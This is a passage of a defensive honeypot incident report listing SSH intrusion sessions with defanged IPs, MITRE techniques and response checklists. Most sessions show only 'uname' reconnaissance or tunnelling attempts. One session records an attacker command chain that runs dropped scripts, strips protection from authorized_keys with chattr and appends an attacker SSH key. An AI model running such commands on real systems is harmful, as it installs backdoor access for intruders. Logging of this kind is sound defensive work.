| `2026-09-12 13:47:12` | `cowrie.session.params` |
| `2026-09-12 13:47:12` | `cowrie.command.input` |
| `2026-09-12 13:47:12` | `cowrie.log.closed` |
| `2026-09-12 13:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7719c5ec79

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:48 |
| **Last Seen** | 2026-09-12 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:48:47` | `cowrie.session.connect` |
| `2026-09-12 13:48:47` | `cowrie.client.version` |
| `2026-09-12 13:48:47` | `cowrie.client.kex` |
| `2026-09-12 13:48:47` | `cowrie.login.success` |
| `2026-09-12 13:48:48` | `cowrie.session.params` |
| `2026-09-12 13:48:48` | `cowrie.command.input` |
| `2026-09-12 13:48:48` | `cowrie.log.closed` |
| `2026-09-12 13:48:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55aafb91dd3b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-12 13:48 |
| **Last Seen** | 2026-09-12 13:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:48:56` | `cowrie.session.connect` |
| `2026-09-12 13:48:56` | `cowrie.client.version` |
| `2026-09-12 13:48:56` | `cowrie.client.kex` |
| `2026-09-12 13:48:57` | `cowrie.login.success` |
| `2026-09-12 13:49:00` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:49:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:49:02` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:49:04` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:49:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:49:04` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:49:05` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:49:06` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:49:06` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ece38b61b60

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:50 |
| **Last Seen** | 2026-09-12 13:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:50:25` | `cowrie.session.connect` |
| `2026-09-12 13:50:25` | `cowrie.client.version` |
| `2026-09-12 13:50:25` | `cowrie.client.kex` |
| `2026-09-12 13:50:25` | `cowrie.login.success` |
| `2026-09-12 13:50:26` | `cowrie.session.params` |
| `2026-09-12 13:50:26` | `cowrie.command.input` |
| `2026-09-12 13:50:26` | `cowrie.log.closed` |
| `2026-09-12 13:50:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa17e916084

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-12 13:51 |
| **Last Seen** | 2026-09-12 13:52 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:51:46` | `cowrie.session.connect` |
| `2026-09-12 13:51:46` | `cowrie.client.version` |
| `2026-09-12 13:51:46` | `cowrie.client.kex` |
| `2026-09-12 13:51:46` | `cowrie.login.success` |
| `2026-09-12 13:51:49` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:51:50` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:51:50` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:51:52` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:51:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:51:55` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:51:57` | `cowrie.direct-tcpip.request` |
| `2026-09-12 13:52:00` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 13:52:00` | `cowrie.direct-tcpip.data` |
| `2026-09-12 13:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b7e503c137a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:52 |
| **Last Seen** | 2026-09-12 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:52:06` | `cowrie.session.connect` |
| `2026-09-12 13:52:06` | `cowrie.client.version` |
| `2026-09-12 13:52:06` | `cowrie.client.kex` |
| `2026-09-12 13:52:06` | `cowrie.login.success` |
| `2026-09-12 13:52:07` | `cowrie.session.params` |
| `2026-09-12 13:52:07` | `cowrie.command.input` |
| `2026-09-12 13:52:07` | `cowrie.log.closed` |
| `2026-09-12 13:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a419c7679ec4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:53 |
| **Last Seen** | 2026-09-12 13:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:53:46` | `cowrie.session.connect` |
| `2026-09-12 13:53:46` | `cowrie.client.version` |
| `2026-09-12 13:53:46` | `cowrie.client.kex` |
| `2026-09-12 13:53:46` | `cowrie.login.success` |
| `2026-09-12 13:53:47` | `cowrie.session.params` |
| `2026-09-12 13:53:47` | `cowrie.command.input` |
| `2026-09-12 13:53:47` | `cowrie.log.closed` |
| `2026-09-12 13:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69b697dd170

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:55 |
| **Last Seen** | 2026-09-12 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:55:21` | `cowrie.session.connect` |
| `2026-09-12 13:55:21` | `cowrie.client.version` |
| `2026-09-12 13:55:21` | `cowrie.client.kex` |
| `2026-09-12 13:55:21` | `cowrie.login.success` |
| `2026-09-12 13:55:22` | `cowrie.session.params` |
| `2026-09-12 13:55:22` | `cowrie.command.input` |
| `2026-09-12 13:55:22` | `cowrie.log.closed` |
| `2026-09-12 13:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b9eb395ba2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:56 |
| **Last Seen** | 2026-09-12 13:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:56:57` | `cowrie.session.connect` |
| `2026-09-12 13:56:57` | `cowrie.client.version` |
| `2026-09-12 13:56:57` | `cowrie.client.kex` |
| `2026-09-12 13:56:58` | `cowrie.login.success` |
| `2026-09-12 13:56:58` | `cowrie.session.params` |
| `2026-09-12 13:56:58` | `cowrie.command.input` |
| `2026-09-12 13:56:58` | `cowrie.log.closed` |
| `2026-09-12 13:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41697d2d47ef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 13:58 |
| **Last Seen** | 2026-09-12 13:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 13:58:38` | `cowrie.session.connect` |
| `2026-09-12 13:58:38` | `cowrie.client.version` |
| `2026-09-12 13:58:38` | `cowrie.client.kex` |
| `2026-09-12 13:58:39` | `cowrie.login.success` |
| `2026-09-12 13:58:40` | `cowrie.session.params` |
| `2026-09-12 13:58:40` | `cowrie.command.input` |
| `2026-09-12 13:58:40` | `cowrie.log.closed` |
| `2026-09-12 13:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0bb01749c03

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:00 |
| **Last Seen** | 2026-09-12 14:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:00:17` | `cowrie.session.connect` |
| `2026-09-12 14:00:17` | `cowrie.client.version` |
| `2026-09-12 14:00:17` | `cowrie.client.kex` |
| `2026-09-12 14:00:18` | `cowrie.login.success` |
| `2026-09-12 14:00:19` | `cowrie.session.params` |
| `2026-09-12 14:00:19` | `cowrie.command.input` |
| `2026-09-12 14:00:19` | `cowrie.log.closed` |
| `2026-09-12 14:00:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd4c06338f4

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-12 14:00 |
| **Last Seen** | 2026-09-12 14:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:00:42` | `cowrie.session.connect` |
| `2026-09-12 14:00:44` | `cowrie.client.version` |
| `2026-09-12 14:00:44` | `cowrie.client.kex` |
| `2026-09-12 14:00:52` | `cowrie.login.success` |
| `2026-09-12 14:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1ed34961cf

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-09-12 14:00 |
| **Last Seen** | 2026-09-12 14:01 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:00:56` | `cowrie.session.connect` |
| `2026-09-12 14:00:56` | `cowrie.client.version` |
| `2026-09-12 14:00:56` | `cowrie.client.kex` |
| `2026-09-12 14:00:56` | `cowrie.login.success` |
| `2026-09-12 14:01:30` | `cowrie.session.params` |
| `2026-09-12 14:01:30` | `cowrie.command.input` |
| `2026-09-12 14:01:30` | `cowrie.log.closed` |
| `2026-09-12 14:01:30` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:30` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:30` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:31` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:31` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:31` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:31` | `cowrie.session.file_upload` |
| `2026-09-12 14:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7f4d270611

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:01 |
| **Last Seen** | 2026-09-12 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:01:55` | `cowrie.session.connect` |
| `2026-09-12 14:01:55` | `cowrie.client.version` |
| `2026-09-12 14:01:55` | `cowrie.client.kex` |
| `2026-09-12 14:01:55` | `cowrie.login.success` |
| `2026-09-12 14:01:56` | `cowrie.session.params` |
| `2026-09-12 14:01:56` | `cowrie.command.input` |
| `2026-09-12 14:01:56` | `cowrie.log.closed` |
| `2026-09-12 14:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d926e170edc9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:03 |
| **Last Seen** | 2026-09-12 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:03:34` | `cowrie.session.connect` |
| `2026-09-12 14:03:34` | `cowrie.client.version` |
| `2026-09-12 14:03:34` | `cowrie.client.kex` |
| `2026-09-12 14:03:34` | `cowrie.login.success` |
| `2026-09-12 14:03:35` | `cowrie.session.params` |
| `2026-09-12 14:03:35` | `cowrie.command.input` |
| `2026-09-12 14:03:35` | `cowrie.log.closed` |
| `2026-09-12 14:03:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7dd83fbfea

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:05 |
| **Last Seen** | 2026-09-12 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:05:17` | `cowrie.session.connect` |
| `2026-09-12 14:05:17` | `cowrie.client.version` |
| `2026-09-12 14:05:17` | `cowrie.client.kex` |
| `2026-09-12 14:05:17` | `cowrie.login.success` |
| `2026-09-12 14:05:18` | `cowrie.session.params` |
| `2026-09-12 14:05:18` | `cowrie.command.input` |
| `2026-09-12 14:05:18` | `cowrie.log.closed` |
| `2026-09-12 14:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-913b9c1c7d9d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:06 |
| **Last Seen** | 2026-09-12 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:06:57` | `cowrie.session.connect` |
| `2026-09-12 14:06:57` | `cowrie.client.version` |
| `2026-09-12 14:06:57` | `cowrie.client.kex` |
| `2026-09-12 14:06:57` | `cowrie.login.success` |
| `2026-09-12 14:06:58` | `cowrie.session.params` |
| `2026-09-12 14:06:58` | `cowrie.command.input` |
| `2026-09-12 14:06:58` | `cowrie.log.closed` |
| `2026-09-12 14:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a16b12a3d3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:08 |
| **Last Seen** | 2026-09-12 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:08:33` | `cowrie.session.connect` |
| `2026-09-12 14:08:33` | `cowrie.client.version` |
| `2026-09-12 14:08:33` | `cowrie.client.kex` |
| `2026-09-12 14:08:34` | `cowrie.login.success` |
| `2026-09-12 14:08:34` | `cowrie.session.params` |
| `2026-09-12 14:08:34` | `cowrie.command.input` |
| `2026-09-12 14:08:35` | `cowrie.log.closed` |
| `2026-09-12 14:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26baa49d0932

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:10 |
| **Last Seen** | 2026-09-12 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:10:11` | `cowrie.session.connect` |
| `2026-09-12 14:10:11` | `cowrie.client.version` |
| `2026-09-12 14:10:11` | `cowrie.client.kex` |
| `2026-09-12 14:10:11` | `cowrie.login.success` |
| `2026-09-12 14:10:12` | `cowrie.session.params` |
| `2026-09-12 14:10:12` | `cowrie.command.input` |
| `2026-09-12 14:10:12` | `cowrie.log.closed` |
| `2026-09-12 14:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5711bd1bdfc

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:11 |
| **Last Seen** | 2026-09-12 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:11:52` | `cowrie.session.connect` |
| `2026-09-12 14:11:52` | `cowrie.client.version` |
| `2026-09-12 14:11:52` | `cowrie.client.kex` |
| `2026-09-12 14:11:52` | `cowrie.login.success` |
| `2026-09-12 14:11:53` | `cowrie.session.params` |
| `2026-09-12 14:11:53` | `cowrie.command.input` |
| `2026-09-12 14:11:53` | `cowrie.log.closed` |
| `2026-09-12 14:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b3e04df547

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:13 |
| **Last Seen** | 2026-09-12 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:13:31` | `cowrie.session.connect` |
| `2026-09-12 14:13:31` | `cowrie.client.version` |
| `2026-09-12 14:13:31` | `cowrie.client.kex` |
| `2026-09-12 14:13:31` | `cowrie.login.success` |
| `2026-09-12 14:13:32` | `cowrie.session.params` |
| `2026-09-12 14:13:32` | `cowrie.command.input` |
| `2026-09-12 14:13:32` | `cowrie.log.closed` |
| `2026-09-12 14:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2e10b51b09

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:15 |
| **Last Seen** | 2026-09-12 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:15:09` | `cowrie.session.connect` |
| `2026-09-12 14:15:09` | `cowrie.client.version` |
| `2026-09-12 14:15:09` | `cowrie.client.kex` |
| `2026-09-12 14:15:09` | `cowrie.login.success` |
| `2026-09-12 14:15:10` | `cowrie.session.params` |
| `2026-09-12 14:15:10` | `cowrie.command.input` |
| `2026-09-12 14:15:10` | `cowrie.log.closed` |
| `2026-09-12 14:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44aba817b743

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:16 |
| **Last Seen** | 2026-09-12 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:16:51` | `cowrie.session.connect` |
| `2026-09-12 14:16:51` | `cowrie.client.version` |
| `2026-09-12 14:16:51` | `cowrie.client.kex` |
| `2026-09-12 14:16:52` | `cowrie.login.success` |
| `2026-09-12 14:16:52` | `cowrie.session.params` |
| `2026-09-12 14:16:52` | `cowrie.command.input` |
| `2026-09-12 14:16:52` | `cowrie.log.closed` |
| `2026-09-12 14:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2de71831e20

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:18 |
| **Last Seen** | 2026-09-12 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:18:35` | `cowrie.session.connect` |
| `2026-09-12 14:18:35` | `cowrie.client.version` |
| `2026-09-12 14:18:35` | `cowrie.client.kex` |
| `2026-09-12 14:18:35` | `cowrie.login.success` |
| `2026-09-12 14:18:36` | `cowrie.session.params` |
| `2026-09-12 14:18:36` | `cowrie.command.input` |
| `2026-09-12 14:18:36` | `cowrie.log.closed` |
| `2026-09-12 14:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3abf8756034d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:20 |
| **Last Seen** | 2026-09-12 14:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
